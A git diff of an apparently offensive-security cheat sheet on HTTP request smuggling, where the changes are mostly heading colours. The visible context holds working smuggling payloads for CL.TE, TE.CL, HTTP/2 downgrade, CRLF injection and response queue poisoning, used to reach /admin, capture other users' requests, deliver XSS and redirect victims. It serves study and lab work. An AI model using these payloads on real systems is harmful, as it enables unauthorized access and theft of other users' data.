@@ -1,7 +1,5 @@
 # HTTP request smuggling
 
-HTTP request smuggling
-
 <details>
 
 <summary>General info</summary>
@@ -41,7 +39,7 @@ q=smuggling
 
 </details>
 
-## <mark style="color:yellow;">Identification</mark>
+## <mark style="color:purple;">Identification</mark>
 
 {% hint style="warning" %}
 **Important**:&#x20;
@@ -50,7 +48,7 @@ q=smuggling
 * In early techniques you must use `HTTP/1.1` protocol, not `HTTP/2`. In burp change it using Inspector.
 {% endhint %}
 
-### <mark style="color:yellow;">**CL.TE**</mark>
+### <mark style="color:purple;">**CL.TE**</mark>
 
 ```http
 POST / HTTP/1.1\r\n
@@ -68,7 +66,7 @@ X
 * The **front-end** server processes the initial chunk based on the Transfer-Encoding header, forwarding only part of the request while omitting the `X`.&#x20;
 * After processing the first chunk, the **backend** server waits for the next one, causing a noticeable time delay.
 
-### <mark style="color:yellow;">TE.CL</mark>
+### <mark style="color:purple;">TE.CL</mark>
 
 ```http
 POST / HTTP/1.1\r\n
@@ -89,7 +87,7 @@ The back-end server, relying on the Content-Length header, waits for additional 
 **Warning**: The timing-based test for TE.CL vulnerabilities will potentially disrupt other application users if the application is vulnerable to the CL.TE variant of the vulnerability. So to be stealthy and minimize disruption, you should use the CL.TE test first and continue to the TE.CL test only if the first test is unsuccessful.
 {% endhint %}
 
-## <mark style="color:yellow;">Confirmation/Exploitation</mark>
+## <mark style="color:purple;">Confirmation/Exploitation</mark>
 
 Normal request
 
@@ -102,7 +100,7 @@ Content-Length: 11
 q=smuggling
 ```
 
-### <mark style="color:yellow;">**CL.TE**</mark>
+### <mark style="color:purple;">**CL.TE**</mark>
 
 ```http
 POST /search HTTP/1.1
@@ -137,7 +135,7 @@ q=smuggling
 
 The server will respond with status code 404, indicating that the attack successful.
 
-### <mark style="color:yellow;">**TE.CL**</mark>
+### <mark style="color:purple;">**TE.CL**</mark>
 
 ```http
 POST /search HTTP/1.1
@@ -165,11 +163,11 @@ x=
 **Note**: Update Content-Length must be unchecked
 {% endhint %}
 
-## <mark style="color:yellow;">Exploitation</mark> <a href="#using-http-request-smuggling-to-bypass-front-end-security-controls" id="using-http-request-smuggling-to-bypass-front-end-security-controls"></a>
+## <mark style="color:purple;">Exploitation</mark> <a href="#using-http-request-smuggling-to-bypass-front-end-security-controls" id="using-http-request-smuggling-to-bypass-front-end-security-controls"></a>
 
-### <mark style="color:yellow;">Bypass front-end security controls</mark> <a href="#using-http-request-smuggling-to-bypass-front-end-security-controls" id="using-http-request-smuggling-to-bypass-front-end-security-controls"></a>
+### <mark style="color:purple;">Bypass front-end security controls</mark> <a href="#using-http-request-smuggling-to-bypass-front-end-security-controls" id="using-http-request-smuggling-to-bypass-front-end-security-controls"></a>
 
-<mark style="color:yellow;">**CL.TE**</mark>
+<mark style="color:purple;">**CL.TE**</mark>
 
 ```http
 POST /home HTTP/1.1
@@ -197,9 +195,9 @@ Host: vulnerable-website.com
 * The front-end server sees two requests here, both for `/home`, and so the requests are forwarded to the back-end server.&#x20;
 * The back-end server sees requests for `/home` and `/admin`, assumes they've passed front-end controls, and grants access to the restricted URL.
 
-### <mark style="color:yellow;">Revealing front-end request rewriting</mark> <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>
+### <mark style="color:purple;">Revealing front-end request rewriting</mark> <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>
 
-<mark style="color:yellow;">**CL.TE**</mark>
+<mark style="color:purple;">**CL.TE**</mark>
 
 Find a request that reflects the value
 
@@ -246,9 +244,9 @@ x-nr-external-service: external
 ...
 ```
 
-### <mark style="color:yellow;">Capturing other users' requests</mark> <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>
+### <mark style="color:purple;">Capturing other users' requests</mark> <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>
 
-<mark style="color:yellow;">**CL.TE**</mark>
+<mark style="color:purple;">**CL.TE**</mark>
 
 Smuggle a request that submits data to the storage function, with the parameter containing the data to store positioned last in the request.
 
@@ -276,9 +274,9 @@ csrf=ihmEx8D&postId=1&name=test&email=test@test.test&comment=
 **Tip**: Another way to steal other users' responses is with the [#response-queue-poisoning](http-request-smuggling.md#response-queue-poisoning "mention") technique.
 {% endhint %}
 
-### <mark style="color:yellow;">Exploit reflected XSS</mark>
+### <mark style="color:purple;">Exploit reflected XSS</mark>
 
-<mark style="color:yellow;">**CL.TE**</mark>
+<mark style="color:purple;">**CL.TE**</mark>
 
 You can use a request smuggling attack to target other users of the application. This method is better than standard reflected XSS because it doesn't require victim interaction and can exploit XSS in areas like HTTP headers, which are not possible to control in typical attacks.
 
@@ -301,9 +299,9 @@ x=1
 
 The next user's request is appended to the smuggled one, delivering the XSS payload in their response.
 
-### <mark style="color:yellow;">Open redirect</mark> <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>
+### <mark style="color:purple;">Open redirect</mark> <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>
 
-<mark style="color:yellow;">**CL.TE**</mark>
+<mark style="color:purple;">**CL.TE**</mark>
 
 ```http
 GET /home HTTP/1.1
@@ -328,17 +326,17 @@ Host: attacker-website.com
 Foo: X
 ```
 
-## <mark style="color:yellow;">Content-Length in the smuggled request</mark>
+## <mark style="color:purple;">Content-Length in the smuggled request</mark>
 
 The value in the `Content-Length` header in the smuggled request will determine how long the back-end server believes the request is. If you set this value too short, you will receive only part of the rewritten request; if you set it too long, the back-end server will time out waiting for the request to complete. Of course, the solution is to guess an initial value that is a bit bigger than the submitted request, and then gradually increase the value to retrieve more information, until you have everything of interest.
 
-## <mark style="color:yellow;">HTTP/2 request smuggling</mark>
+## <mark style="color:purple;">HTTP/2 request smuggling</mark>
 
 **HTTP/2 downgrading**
 
 HTTP/2 downgrading converts HTTP/2 requests into HTTP/1 syntax, allowing web servers and proxies to support HTTP/2 clients while communicating with HTTP/1 back-end servers.
 
-## <mark style="color:yellow;">Identification</mark>
+## <mark style="color:purple;">Identification</mark>
 
 ### <mark style="color:yellow;">H2.CL</mark> <a href="#h2-cl-vulnerabilities" id="h2-cl-vulnerabilities"></a>
 
@@ -353,7 +351,7 @@ Foo: x
 
 Then send another request and you'll get `/404` .
 
-### <mark style="color:yellow;">H2.TE</mark> <a href="#h2-te-vulnerabilities" id="h2-te-vulnerabilities"></a>
+### <mark style="color:purple;">H2.TE</mark> <a href="#h2-te-vulnerabilities" id="h2-te-vulnerabilities"></a>
 
 ```http
 POST / HTTP/2
@@ -368,9 +366,9 @@ Host: vulnerable-website.com
 Foo: x
 ```
 
-## <mark style="color:yellow;">Exploitation</mark>
+## <mark style="color:purple;">Exploitation</mark>
 
-### <mark style="color:yellow;">H2.CL</mark> <a href="#h2-cl-vulnerabilities" id="h2-cl-vulnerabilities"></a>
+### <mark style="color:purple;">H2.CL</mark> <a href="#h2-cl-vulnerabilities" id="h2-cl-vulnerabilities"></a>
 
 ```http
 POST / HTTP/2
@@ -384,7 +382,7 @@ Content-Length: 5
 x=1
 ```
 
-### <mark style="color:yellow;">H2.TE</mark> <a href="#h2-te-vulnerabilities" id="h2-te-vulnerabilities"></a>
+### <mark style="color:purple;">H2.TE</mark> <a href="#h2-te-vulnerabilities" id="h2-te-vulnerabilities"></a>
 
 ```http
 POST / HTTP/2
@@ -399,7 +397,7 @@ Host: vulnerable-website.com
 Foo: x
 ```
 
-## <mark style="color:yellow;">Request smuggling via CRLF injection</mark> <a href="#request-smuggling-via-crlf-injection" id="request-smuggling-via-crlf-injection"></a>
+## <mark style="color:purple;">Request smuggling via CRLF injection</mark> <a href="#request-smuggling-via-crlf-injection" id="request-smuggling-via-crlf-injection"></a>
 
 In HTTP/2 messages `\r\n` no longer has any special significance within a header value and, therefore, can be included inside the value itself without causing the header to be split. when this is rewritten as an HTTP/1 request, the `\r\n` will once again be interpreted as a header delimiter. As a result, an HTTP/1 back-end server would see two distinct headers.
 
@@ -422,7 +420,7 @@ Foo: x
 **Note**: to inject newlines into HTTP/2 headers, in burp use the Inspector to drill down into the header, then press the `Shift + Return` keys.
 {% endhint %}
 
-## <mark style="color:yellow;">Response queue poisoning</mark>
+## <mark style="color:purple;">Response queue poisoning</mark>
 
 <details>
 
@@ -454,7 +452,7 @@ Host: vulnerable-website.com\r\n
 \r\n
 ```
 
-## <mark style="color:yellow;">HTTP/2 request splitting</mark>
+## <mark style="color:purple;">HTTP/2 request splitting</mark>
 
 This approach is more versatile, allowing even GET requests without relying on methods that support a body.
 
@@ -484,7 +482,7 @@ foo             bar\r\n
 **Note**: here the request triggerg response queue poisoning, but you can also smuggle prefixes for classic request smuggling.
 {% endhint %}
 
-## <mark style="color:yellow;">CL.0/H2.0 request smuggling</mark>
+## <mark style="color:purple;">CL.0/H2.0 request smuggling</mark>
 
 Some servers ignore the `Content-Length` header, treating requests as ending at the headers, effectively making `Content-Length 0`. If the back-end behaves this way while the front-end uses Content-Length, this discrepancy enables HTTP request smuggling, termed a "CL.0" vulnerability.
 
